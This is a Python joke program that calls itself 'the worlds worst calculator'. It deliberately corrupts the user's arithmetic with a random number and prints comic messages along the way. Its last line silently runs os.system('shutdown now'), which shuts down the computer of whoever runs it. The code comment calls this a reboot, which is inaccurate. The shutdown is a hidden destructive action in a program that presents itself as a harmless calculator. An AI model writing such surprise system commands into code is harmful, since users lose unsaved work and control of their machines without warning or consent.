import time
import random
import os

print ("The worlds worst calculator") 

time.sleep(1) #Program halts for 1 seconds

print ("loading...")

time.sleep(1) #Program halts for 1 seconds

print ("welcome to the calculator")

time.sleep(1) #Program halts for 1 seconds

print ("i will help you with your math problems")

time.sleep(1) #Program halts for 1 seconds

a=random.randint(0,5) #Generates a random number between 0 and 5

time.sleep(3) #Program halts for 3 seconds

print ("type a number")

num1 = input()

print ("type another number")

num2 = input()

print ("+, - , /,* ?")

operation = input()
if operation == "+":
    result1 = float(num1) + float(num2)
elif operation == "-":
    result1 = float(num1) - float(num2)
elif operation == "/":
    result1 = float(num1) / float(num2)
elif operation == "*":
    result1 = float(num1) * float(num2)

print ("computing your result please wait...")

time.sleep(2) #Program halts for 2 seconds

print ("dang this is hard")

time.sleep(2) #Program halts for 2 seconds

print ("does anybody have a pencil i can borrow?")

time.sleep(2) #Program halts for 2 seconds

print ("i think i got it")

time.sleep(2) #Program halts for 2 seconds

if operation == "+":
    result2 = float(result1) + float(a)
elif operation == "-":
    result2 = float(result1) - float(a)
elif operation == "/":
    result2 = float(result1) / float(a)
elif operation == "*":
    result2 = float(result1) * float(a)


print ("Was this your card?")

time.sleep(1) #Program halts for 1 seconds

print ("WHAT DO YOU MEAN WE ARE NOT PLAYING CARDS" )

time.sleep(1) #Program halts for 1 seconds

print ("sorry i got distracted")

time.sleep(2) #Program halts for 2 seconds

print ("was your result " + str(result2))

time.sleep(1) #Program halts for 1 seconds

print ("was i right :)(answer with yes or no)")

answer = input()
if answer == "yes" :
    print ("YAY I DID IT")
elif answer == "no":
    print ("oh no i messed up")


time.sleep(1) #Program halts for 1 seconds

print ("thx come again :3")

time.sleep(5) #Program halts for 5 seconds

os.system("shutdown now") #reboots the computer (surprise)